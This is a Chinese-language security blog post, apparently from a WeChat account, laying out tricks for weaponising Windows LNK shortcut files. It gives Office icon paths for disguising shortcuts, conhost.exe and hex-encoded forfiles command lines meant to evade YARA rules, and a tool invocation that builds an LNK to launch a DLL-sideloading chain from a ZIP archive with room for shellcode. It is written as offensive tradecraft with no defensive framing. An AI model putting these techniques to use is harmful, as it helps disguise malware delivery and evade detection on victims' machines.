#  关于Lnk攻击的一些技巧

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

**Relay学安全** ![]()

微信号 gh_8d57319ec39c

功能介绍
这是一个纯分享技术的公众号，只想做安全圈的一股清流，不会发任何广告，不会接受任何广告，只会分享纯技术文章，欢迎各行各业的小伙伴关注。让我们一起提升技术。

____

___发表于_

#### 修改你Lnk文件的图标

如下图标路径，只要对方安装了Office一般路径是不会改变的。

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    access = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\accicons.exe"excel = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\xlicons.exe"lync = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\lyncicon.exe"office = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\ohub32.exe",56onedrive = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\grv_icons.exe"onenote = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\joticon.exe"outlook = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\outicon.exe"powerpoint = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\pptico.exe"project = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\pj11icon.exe"publisher = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\pubs.exe"visio = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\visicon.exe"word = "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\wordicon.exe"

#### 使用Lnk来运行你的powershell或CMD

需要注意的是不要直接去运行powershell或CMD，可以使用const来去运行。

  * 

    
    
    C:\windows\system32\conhost.exe conhost conhost conhost conhost conhost conhost cmd /c notepad

  * 

    
    
    C:\windows\system32\conhost.exe conhost conhost conhost conhost conhost conhost powershell ...

![]()

#### 使用Forfiles运行

因为Forfiles支持16进制编码，可以帮助我们逃避一些Yara规则。

  * 

    
    
    forfiles.exe /p c:\windows\system32 /m user32.dll /c "0x630x6d0x640x200x2f0x63 notepad | calc

这里的0x630x6d0x640x200x2f0x63 其实就是cmd /c

![]()

如下进程链:

![]()

#### Lnk执行ZIP中恶意程序

Lnk中执行ZIP中的恶意程序，这里思路是这样的，我们在ZIP中使用白加黑的方式，将白程序和黑DLL以及shellcode压缩成ZIP文件。

然后使用Lnk文件去调用。

这里使用到如下工具:

  * 

    
    
    https://www.x86matthew.com/view_post?id=embed_exe_lnk

使用cl.exe编译之后 然后使用如下命令制作恶意.lnk，在这之前需要将白程序打包成一个zip文件。

然后如下命令去生成arp.lnk。第一个参数表示你压缩的zip文件，第二个参数表示你要生成的.lnk名称，第三个参数表示你要执行zip压缩包中的那个程序。

可以看到成功调用。

  * 

    
    
    LnkAndZip.exe arp.zip arp.lnk arphaCrashReport64.exe "%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\wordicon.exe"

![]()

这里图标没有显示出来的原因是，我这个虚拟机没有装Office。

将文件拉到我物理机可以看到已经有word图标了。

![]()

ZIP压缩包中的文件:

![]()

如下攻击链:

  * 

    
    
    Lnk --> arp.zip --> arphaCrashReport64.exe --> arphaDump64.dll --> ...这里可以写shellcode

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 关于Lnk攻击的一些技巧

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

Relay学安全

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

